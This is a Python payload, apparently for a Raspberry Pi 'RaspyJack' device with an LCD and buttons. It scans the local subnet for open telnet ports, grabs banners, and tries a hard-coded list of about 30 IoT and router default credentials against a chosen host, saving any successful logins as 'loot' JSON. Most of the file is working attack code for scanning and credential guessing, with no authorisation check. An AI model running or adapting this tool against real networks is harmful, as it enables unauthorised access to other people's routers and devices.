#!/usr/bin/env python3
"""
RaspyJack Payload -- Telnet Banner Grab & Default Cred Test
============================================================
Author: 7h30th3r0n3

Scans for port 23 on the local subnet, grabs banners via raw socket,
then tries ~30 common IoT/router default credentials.

Setup / Prerequisites:
  - Built-in default credential list. No special requirements.

Controls:
  OK         -- Start test on selected host
  UP / DOWN  -- Scroll results
  KEY1       -- Scan for Telnet hosts
  KEY2       -- Export results to loot
  KEY3       -- Exit

Loot: /root/Raspyjack/loot/Telnet/telnet_YYYYMMDD_HHMMSS.json
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import ipaddress
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT
ROWS_VISIBLE = 5
LOOT_DIR = "/root/Raspyjack/loot/Telnet"
NMAP_LOOT = "/root/Raspyjack/loot"

# ---------------------------------------------------------------------------
# Default credential pairs for IoT / routers / switches
# ---------------------------------------------------------------------------
CRED_LIST = [
    ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
    ("admin", ""), ("admin", "default"), ("admin", "changeme"),
    ("root", "root"), ("root", ""), ("root", "password"),
    ("root", "toor"), ("root", "default"), ("root", "1234"),
    ("cisco", "cisco"), ("cisco", ""), ("enable", ""),
    ("user", "user"), ("user", "password"), ("guest", "guest"),
    ("guest", ""), ("manager", "manager"), ("manager", "friend"),
    ("support", "support"), ("tech", "tech"), ("ubnt", "ubnt"),
    ("pi", "raspberry"), ("admin", "admin1234"), ("admin", "12345"),
    ("operator", "operator"), ("monitor", "monitor"), ("service", "service"),
]

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
running = True
scan_active = False
test_active = False

hosts = []          # [{"ip": str, "banner": str}]
selected_idx = 0
scroll_offset = 0

results = []        # [{"ip", "banner", "creds": [{"user","pass"}]}]
status_msg = ""
test_progress = 0
test_total = 0
current_pair = ("", "")


# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def _detect_subnet():
    """Return the local subnet CIDR."""
    for iface in ("eth0", "wlan0"):
        try:
            res = subprocess.run(
                ["ip", "-4", "addr", "show", iface],
                capture_output=True, text=True, timeout=5,
            )
            for line in res.stdout.splitlines():
                stripped = line.strip()
                if stripped.startswith("inet "):
                    return stripped.split()[1]
        except Exception:
            pass
    return None


def _grab_banner(ip, port=23, timeout=3):
    """Connect to a telnet port and grab any banner text."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        # Read whatever the server sends initially
        time.sleep(0.5)
        banner_bytes = b""
        try:
            while True:
                chunk = sock.recv(1024)
                if not chunk:
                    break
                banner_bytes += chunk
                if len(banner_bytes) > 2048:
                    break
        except socket.timeout:
            pass
        sock.close()
        # Strip telnet negotiation bytes (IAC sequences: 0xFF ...)
        cleaned = bytearray()
        i = 0
        raw = banner_bytes
        while i < len(raw):
            if raw[i] == 0xFF and i + 2 < len(raw):
                i += 3  # skip IAC + command + option
            else:
                cleaned.append(raw[i])
                i += 1
        return bytes(cleaned).decode("utf-8", errors="replace").strip()[:200]
    except Exception:
        return ""


def _scan_telnet_hosts(cidr):
    """Quick TCP connect scan for port 23."""
    found = []
    try:
        network = ipaddress.IPv4Network(cidr, strict=False)
    except ValueError:
        return found
    for host in network.hosts():
        if not running:
            break
        ip = str(host)
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            result = sock.connect_ex((ip, 23))
            sock.close()
            if result == 0:
                banner = _grab_banner(ip)
                found.append({"ip": ip, "banner": banner})
        except Exception:
            pass
    return found


# ---------------------------------------------------------------------------
# Scan thread
# ---------------------------------------------------------------------------

def _scan_thread():
    """Background thread to discover Telnet hosts."""
    global scan_active, status_msg
    scan_active = True

    with lock:
        status_msg = "Scanning subnet..."

    cidr = _detect_subnet()
    if not cidr or not running:
        with lock:
            status_msg = "No network found"
            scan_active = False
        return

    found = _scan_telnet_hosts(cidr)

    with lock:
        hosts.clear()
        hosts.extend(found)
        status_msg = f"Found {len(hosts)} Telnet host(s)"

    scan_active = False


# ---------------------------------------------------------------------------
# Credential test thread
# ---------------------------------------------------------------------------

def _try_telnet_login(ip, user, passwd, timeout=5):
    """Try a telnet login by sending user/pass after prompts."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, 23))

        # Read initial banner / login prompt
        time.sleep(1.0)
        data = b""
        try:
            while True:
                chunk = sock.recv(1024)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass

        # Send username
        sock.sendall((user + "\r\n").encode())
        time.sleep(0.8)
        data = b""
        try:
            while True:
                chunk = sock.recv(1024)
                if not chunk:
                    break
                data += chunk
        except socket.timeout:
            pass

        # Send password
        sock.sendall((passwd + "\r\n").encode())
        time.sleep(1.0)
        response = b""
        try:
            while True:
                chunk = sock.recv(2048)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass

        sock.close()
        text = response.decode("utf-8", errors="replace").lower()

        # Heuristic: if we see a shell prompt or welcome, login succeeded
        fail_indicators = ["incorrect", "invalid", "failed", "denied", "bad"]
        success_indicators = ["#", "$", ">", "welcome", "successful", "last login"]

        for fail in fail_indicators:
            if fail in text:
                return False
        for ok in success_indicators:
            if ok in text:
                return True

        return False
    except Exception:
        return False


def _test_thread(target_ip):
    """Test default credentials against a single host."""
    global test_active, test_progress, test_total
    global current_pair, status_msg

    test_active = True
    with lock:
        test_progress = 0
        test_total = len(CRED_LIST)
        current_pair = ("", "")

    host_creds = []

    for idx, (user, passwd) in enumerate(CRED_LIST):
        if not running or not test_active:
            break

        with lock:
            current_pair = (user, passwd)
            test_progress = idx + 1

        success = _try_telnet_login(target_ip, user, passwd)

        if success:
            host_creds.append({"user": user, "pass": passwd})
            with lock:
                status_msg = f"FOUND: {user}:{passwd}"

    # Store results
    with lock:
        existing = next((r for r in results if r["ip"] == target_ip), None)
        banner = next((h["banner"] for h in hosts if h["ip"] == target_ip), "")
        if existing:
            existing["creds"].extend(host_creds)
        else:
            results.append({
                "ip": target_ip,
                "banner": banner,
                "creds": host_creds,
            })

        if not host_creds:
            status_msg = "No creds found"
        test_active = False


# ---------------------------------------------------------------------------
# Export
# ---------------------------------------------------------------------------

def _export_loot():
    """Write results to JSON loot file."""
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filepath = os.path.join(LOOT_DIR, f"telnet_{ts}.json")
    with lock:
        data = {
            "timestamp": ts,
            "hosts": [dict(h) for h in hosts],
            "results": [dict(r) for r in results],
        }
    with open(filepath, "w") as fh:
        json.dump(data, fh, indent=2)
    return os.path.basename(filepath)


# ---------------------------------------------------------------------------
# Display
# ---------------------------------------------------------------------------

def _draw_frame(lcd, font, mode):
    """Render current state to the LCD."""
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    # Header
    d.rectangle((0, 0, 127, 13), fill="#111")
    d.text((2, 1), "TELNET GRAB", font=font, fill="#FFAA00")
    indicator = "#00FF00" if (test_active or scan_active) else "#444"
    d.ellipse((118, 3, 122, 7), fill=indicator)

    with lock:
        host_list = list(hosts)
        res_list = list(results)
        msg = status_msg
        prog = test_progress
        total = test_total
        pair = current_pair

    if mode == "hosts":
        d.text((2, 16), f"Hosts: {len(host_list)}", font=font, fill="#AAAAAA")
        visible = host_list[scroll_offset:scroll_offset + ROWS_VISIBLE]
        for i, h in enumerate(visible):
            y = 28 + i * 18
            real_idx = scroll_offset + i
            prefix = ">" if real_idx == selected_idx else " "
            color = "#00FF00" if real_idx == selected_idx else "#CCCCCC"
            d.text((2, y), f"{prefix}{h['ip']}", font=font, fill=color)
            banner_preview = h["banner"][:20] if h["banner"] else "(no banner)"
            d.text((10, y + 10), banner_preview, font=font, fill="#666")

    elif mode == "test":
        target = host_list[selected_idx]["ip"] if host_list else "?"
        d.text((2, 16), f"Target: {target}", font=font, fill="#AAAAAA")

        pct = prog / max(total, 1)
        d.rectangle((4, 30, 124, 38), outline="#444")
        fill_w = int(pct * 118)
        if fill_w > 0:
            d.rectangle((5, 31, 5 + fill_w, 37), fill="#FFAA00")

        d.text((2, 42), f"{prog}/{total} ({int(pct*100)}%)", font=font, fill="#AAAAAA")
        d.text((2, 54), f"Try: {pair[0]}:{pair[1]}", font=font, fill="#CCCCCC")

        # Show found creds for this host
        target_res = next((r for r in res_list if r["ip"] == target), None)
        if target_res and target_res["creds"]:
            y = 68
            for c in target_res["creds"][-3:]:
                d.text((2, y), f"{c['user']}:{c['pass']}",
                       font=font, fill="#00FF00")
                y += 12

    if msg:
        d.text((2, 104), msg[:22], font=font, fill="#FFAA00")

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    if test_active:
        d.text((2, 117), "Testing... K3:Exit", font=font, fill="#888")
    elif scan_active:
        d.text((2, 117), "Scanning... K3:Exit", font=font, fill="#888")
    else:
        d.text((2, 117), "OK:Go K1:Scan K3:Quit", font=font, fill="#888")

    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global running, test_active, selected_idx, scroll_offset, status_msg

    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()
    font = scaled_font()

    # Splash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 16), "TELNET BANNER GRAB", font=font, fill="#FFAA00")
    d.text((4, 36), "Banner + default creds", font=font, fill="#888")
    d.text((4, 56), "OK    Test host", font=font, fill="#666")
    d.text((4, 68), "KEY1  Scan subnet", font=font, fill="#666")
    d.text((4, 80), "KEY2  Export loot", font=font, fill="#666")
    d.text((4, 92), "KEY3  Exit", font=font, fill="#666")
    lcd.LCD_ShowImage(img, 0, 0)
    time.sleep(1.5)

    mode = "hosts"

    try:
        while running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                break

            elif btn == "KEY1" and not scan_active and not test_active:
                threading.Thread(target=_scan_thread, daemon=True).start()
                time.sleep(0.3)

            elif btn == "OK" and not test_active and not scan_active:
                with lock:
                    has_hosts = len(hosts) > 0
                if has_hosts:
                    target = hosts[selected_idx]["ip"]
                    mode = "test"
                    test_active = True
                    threading.Thread(
                        target=_test_thread, args=(target,), daemon=True,
                    ).start()
                else:
                    with lock:
                        status_msg = "No hosts. KEY1 to scan"
                time.sleep(0.3)

            elif btn == "UP" and not test_active:
                with lock:
                    if hosts:
                        selected_idx = max(0, selected_idx - 1)
                        if selected_idx < scroll_offset:
                            scroll_offset = selected_idx
                time.sleep(0.15)

            elif btn == "DOWN" and not test_active:
                with lock:
                    if hosts:
                        selected_idx = min(len(hosts) - 1, selected_idx + 1)
                        if selected_idx >= scroll_offset + ROWS_VISIBLE:
                            scroll_offset = selected_idx - ROWS_VISIBLE + 1
                time.sleep(0.15)

            elif btn == "KEY2":
                with lock:
                    has_results = len(results) > 0 or len(hosts) > 0
                if has_results:
                    fname = _export_loot()
                    with lock:
                        status_msg = f"Saved: {fname[:18]}"
                else:
                    with lock:
                        status_msg = "No data to export"
                time.sleep(0.3)

            if not test_active and mode == "test":
                mode = "hosts"

            _draw_frame(lcd, font, mode)
            time.sleep(0.05)

    finally:
        running = False
        test_active = False
        time.sleep(0.3)
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
